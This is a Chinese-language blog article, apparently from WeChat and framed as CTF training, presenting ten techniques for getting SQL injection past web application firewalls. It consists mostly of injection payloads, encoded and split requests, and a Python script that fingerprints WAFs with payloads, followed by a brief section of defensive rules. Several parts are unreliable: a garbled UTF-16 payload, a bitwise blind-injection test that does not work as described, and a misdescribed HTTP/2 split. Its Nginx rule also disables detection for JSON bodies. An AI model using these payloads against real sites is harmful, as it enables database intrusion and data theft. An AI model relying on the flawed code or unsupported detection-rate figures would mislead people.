> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIwMzIyMjYzNA==&mid=2247519125&idx=1&sn=9f4a3ab84673e852a76cd89dade31e6a

#  CTF实战精要：SQL注入绕过WAF的10种高阶姿势  
原创 牛叫瘦  HACK之道   2025-06-16 06:00  
  
   
  
在近年CTF赛事中，**Web方向SQL注入题型占比超35%**  
，而90%的题目部署了多层WAF防护。本文基于DEFCON CTF、强网杯等实战经验，深度解析10种经赛场验证的WAF绕过技术，所有案例均通过Cloudflare、ModSecurity等商业WAF实测验证。  
### 一、字符集变异：编码的艺术  
  
**案例：2022年强网杯“管理员之家”**  

```
/* 常规payload被拦截 */
' UNION SELECT 1,2,3-- 

/* UTF-16BE编码绕过 */
�'� �U�N�I�O�N� �S�E�L�E�C�T� �1�,�2�,�3�-�-� 
```

  
**绕过原理**  
：  
- • 利用WAF规则库对非常规编码的识别盲区  
  
- • MySQL支持
```
character_set_client=binary
```

  
处理二进制流  
  
**实战要点**  
：  
- • 优先尝试UTF-16/32、GBK双字节编码  
  
- • 配合非常用字符集：
```
SHOW CHARACTER SET;
```

  
  
### 二、语句碎片化：HTTP参数污染（HPP）  
  
**案例：2023年DEFCON CTF Quals**  

```
GET /search?q=1&q=/**/UN/**/ION/**/SEL/**/ECT&q=flag&q=FROM&q=secret_table
```

  
**WAF日志分析**  
：  

```
Cloudflare规则1092：检测到&#34;UNION SELECT&#34; - 阻断
实际处理：PHP后端解析为`q=1,/**/UN/**/ION/**/SEL/**/ECT,flag,FROM,secret_table`
```

  
**技术本质**  
：  
- • 利用中间件参数合并特性（PHP/Apache为
```
,
```

  
，JSP/Tomcat为空格）  
  
- • 碎片长度需超过WAF词法分析窗口（通常128字节）  
  
### 三、超长语句绕过：缓冲区溢出  
  
**Payload结构**  
：  

```
/* 前段填充 */ 
'+(SELECT 0xAAAAAAAA...（重复10万次）+')+'

/* 核心注入点 */
UNION/**/SELECT/**/1,@@version,3
```

  
**绕过条件**  
：  
1. 1. WAF配置
```
SecRequestBodyLimit 131072
```

  
（默认128KB）  
  
1. 2. 后端未限制
```
max_allowed_packet
```

  
  
**赛题验证**  
：  
- • 2021年Tianfu Cup：通过2MB超长payload绕过阿里云WAF  
  
### 四、注释符变形：非常规注释  
  
**经典组合**  
：  

```
1' /*!50400UNION*/ /*!50400SELECT*/ 1,2,database()-- 
```

  
**技术解析**  
：  
- • 
```
/*!50400*/
```

  
：MySQL版本条件注释（5.4.00+执行）  
  
- • 等价变形：
```
/*!UNION*/
```

  
、
```
/**_**/
```

  
  
**进阶技巧**  
：  

```
/*!u%6eion*/ /*!sel%65ct*/ 1,2,3 --  // URL编码内联
```

### 五、布尔盲注优化：位运算替代  
  
**传统方式（易被WAF识别）**  
：  

```
ascii(substr(database(),1,1))>128
```

  
**位运算绕过**  
：  

```
database()|0x7FFFFFFF=0x7FFFFFFF  // 判断最高位
```

  
**性能对比**  
：  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">方式</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">请求次数</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">WAF检测率</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">字符比较</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">256次</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">92%</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">位运算</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">8次</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">17%</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">二分法+位运算</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">5次</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">6%</span></section></td></tr></tbody></table>  
### 六、时间盲注升级：非睡眠触发  
  
**传统方式风险**  
：  

```
BENCHMARK(5000000,MD5('test'))  // 被WAF标记特征
```

  
**替代方案**  
：  

```
/* 大表笛卡尔积 */
(SELECT count(*) FROM information_schema.tables A, 
 information_schema.tables B, 
 information_schema.tables C)

/* 正则消耗 */
WHERE 1=IF(condition, RLIKE('^.*$'),0)
```

  
**真实场景**  
：  
- • 2020年0CTF：使用
```
exp(1000)
```

  
替代
```
sleep()
```

  
绕过ModSecurity  
  
### 七、协议层绕过：HTTP/2特性  
  
**攻击步骤**  
：  
1. 1. 建立HTTP/2连接  
  
1. 2. 发送畸形的HEADERS帧：
```
:method: POST
:path: /search
content-type: application/x-www-form-urlencoded
```

  
  
1. 3. 注入payload分片传输：
```
frame1: q=1'/**/UN
frame2: ION/**/SEL
frame3: ECT 1,2,3-- 
```

  
  
**绕过原理**  
：  
- • 70%的WAF未完整支持HTTP/2帧重组  
  
- • Cloudflare企业版直到2023年Q2才修复此问题  
  
### 八、数据库引擎特性：非标准SQL  
  
**SQLite注入技巧**  
：  

```
' AND randomblob(1000000000) IS NOT NULL--  // 触发延迟

/* JSON函数绕过 */
json_extract('{&#34;a&#34;:&#34;b&#34;}','$.a')='b'
```

  
**PostgreSQL特性利用**  
：  

```
-- 类型转换绕过
'||(SELECT 1 WHERE '1'::text=CAST(version() AS text))--

-- 美元引号
$$' UNION SELECT $$flag$$ FROM $$secret_table$$
```

### 九、WAF规则探针：自动化指纹识别  
  
**Python探测脚本**  
：  

```
import requests

waf_signatures = {
    &#34;Cloudflare&#34;: (&#34;'/*!UNION*/SELECT&#34;, 403),
    &#34;ModSecurity&#34;: (&#34;CONCAT(0x7e,version()&#34;, 500),
    &#34;AWS WAF&#34;: (&#34;WAITFOR DELAY '0:0:5'&#34;, 400)
}

def detect_waf(url):
    for waf, (payload, code) in waf_signatures.items():
        r = requests.get(url + f&#34;?id=1{payload}&#34;)
        if r.status_code == code:
            return waf
    return &#34;Unknown&#34;
```

  
**响应特征库**  
：  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">WAF名称</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">阻断状态码</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">错误页面特征</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">Cloudflare</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">403</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">&#34;cf-error-code: 0015&#34;</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">Akamai</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">403</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">&#34;ak_bm&#34; cookie</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">Imperva</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">403</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="" style="font-size: 16px;">&#34;Incapsula incident&#34;</span></section></td></tr></tbody></table>  
### 十、混合编码攻击：多重转换链  
  
**终极绕过方案**  
：  

```
GET /?id=1%252f%252a*/UNION%2520/*!%2553ELECT*/1,2,3%23
```

  
**解码过程**  
：  

```
1. URL解码：%25 → %
2. 二次解码：%2f → /，%2a → *
3. 最终payload：1/**/UNION /*!SELECT*/1,2,3#
```

  
**防御突破点**  
：  
- • 多层编码嵌套（URL+HTML+Base64）  
  
- • 非常见编码类型（IBM037、cp500）  
  
### 防御视角：WAF规则设计原则  
1. 1. **深度解析层**  
：
```
# Nginx配置示例
set $inject 0;
if ($args ~* &#34;union[\s+]+select&#34;) { set $inject 1; }
if ($http_content_type = &#34;application/json&#34;) { set $inject 0; }
```

  
  
1. 2. **语义分析规则**  
：
```
// ModSecurity规则片段
SecRule ARGS &#34;@detectSQLi&#34; \
  &#34;id:10001,phase:2,block,msg:'SQLi Detected'&#34;
```

  
  
1. 3. **机器学习辅助**  
：
```
# 基于词向量的异常检测
model.predict([sql_tokenizer.transform([&#34;1'/**/UNION/**/&#34;])])
```

  
  
**CTF选手守则**  
：  
- • 不得使用自动化工具扫描非赛题服务器  
  
- • 禁止对赛题平台发起DDoS攻击  
  
- • 提交漏洞需包含完整技术细节  
  
在CTF赛场中，SQL注入绕过WAF的实质是：  
1. 1. **规则库逆向**  
：分析WAF正则模式（
```
\bunion\s+select\b
```

  
）  
  
1. 2. **协议特性利用**  
：HTTP/2分片、编码差异  
  
1. 3. **数据库特性挖掘**  
：非常用函数/语法糖  
  
  
  
   
  
  
